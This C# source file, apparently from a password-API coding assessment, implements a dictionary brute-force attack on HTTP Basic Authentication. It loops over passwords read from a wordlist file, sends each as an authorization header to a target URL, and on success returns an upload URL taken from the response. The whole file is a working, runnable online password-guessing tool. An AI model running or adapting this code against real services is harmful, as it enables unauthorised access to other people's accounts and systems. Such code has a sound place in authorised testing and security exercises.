using Password_API_Assessment.Interfaces;
using System;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Newtonsoft.Json;

namespace Password_API_Assessment.Data
{
    public class Authenticator : IAuthenticator
    {
        public async Task<string> Authenticate(string url, string username, string dictFile)
        {
            Console.WriteLine("Starting brute-force attack...");

            using (HttpClient client = new HttpClient())
            {
                foreach (string password in File.ReadLines(dictFile))
                {
                    var authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{username}:{password}"));
                    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", authHeader);

                    HttpResponseMessage response = await client.GetAsync(url);
                    if (response.IsSuccessStatusCode)
                    {
                        string content = await response.Content.ReadAsStringAsync();
                        try
                        {
                            var result = JsonConvert.DeserializeObject<dynamic>(content);
                            string uploadUrl = result?.url;
                            Console.WriteLine($"Authenticated! Upload URL: {uploadUrl}");
                            return uploadUrl;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error parsing authentication response: {ex.Message}");
                        }
                    }
                }
            }

            return null;
        }

    }
}

